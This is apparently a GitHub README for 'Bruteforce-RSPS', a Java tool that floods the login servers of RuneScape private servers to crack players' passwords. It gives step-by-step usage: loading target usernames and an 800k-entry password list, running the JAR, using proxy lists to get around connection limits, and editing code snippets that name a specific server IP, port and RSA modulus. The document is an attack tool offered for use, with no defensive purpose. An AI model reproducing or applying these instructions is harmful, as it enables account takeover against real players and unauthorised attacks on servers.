# Bruteforce-RSPS

(Originally made this in 2012 - Converted to Gradle & added a few updates in 2016-2017) [Lots of out-dated code, but still works fine]

# Download
JAR: [Bruteforce-RSPS-1.0.jar](https://github.com/KaiBurton/Bruteforce-RSPS/blob/main/build/libs/Bruteforce-RSPS-1.0.jar)

# Description

Floods the Login Server of a RuneScape Private Server until it gets the password of the account. I had created this back in 2012 so a lot of servers have added various protection to prevent against this now. You can use deobfuscation & network capturing tools to see what kind of protection is on the server before bruteforcing. Some servers may be limiting login connections, so you'll need to use a proxy list.

# Usage

1. Modify the players.txt and enter the usernames you wish to crack.
2. Add a password list to the file path `lists/stoned/800k Stoned.txt`.
3. Modify the server you wish to Bruteforce by changing `serverManager = new GodzPk(username, password, stream, inStream, aStream_847, getStore(), flag, rsSocket);` to the new class file you have created.
4. Create a batch file within the same location as BruteForce-RSPS-1.0.jar and include `java -jar Bruteforce-RSPS-1.0.jar -Cr -o=cracked.txt -p=passwords.txt -U=players.txt`

# Requirements

1. You will require at-least JRE/JDK 1.8 to run this.
2. Your own password list, or the RSPS password list that @st0x0ne and I have compiled (lists/stoned/800K Stoned.txt).
3. You'll also need to understand how the RuneScape login protocol works for the revision/server you with to Bruteforce. You can use one of my templates as an example within `Bruteforce-RSPS\src\main\java\aniski\rs\servers`.

# Expected Changes (For Most Servers):

IP Address & Port:

    private static final String serverAddress = "142.44.136.172";
    private static final int port = 43594;

RSA Encrypt Keys:

    private final BigInteger RSA_MODULUS = new BigInteger("141038977654242498796653256463581947707085475448374831324884224283104317501838296020488428503639086635001378639378416098546218003298341019473053164624088381038791532123008519201622098961063764779454144079550558844578144888226959180389428577531353862575582264379889305154355721898818709924743716570464556076517");
    private final BigInteger RSA_EXPONENT = new BigInteger("65537");

Custom bytes/strings:

            getStream().writeString(stringBuilder.toString());
            getStream().writeString(getPassword());
            getStream().writeString(macAddress);
            getStream().writeString(" ");

            getStream().writeShort(222);
            getStream().writeByte(0);
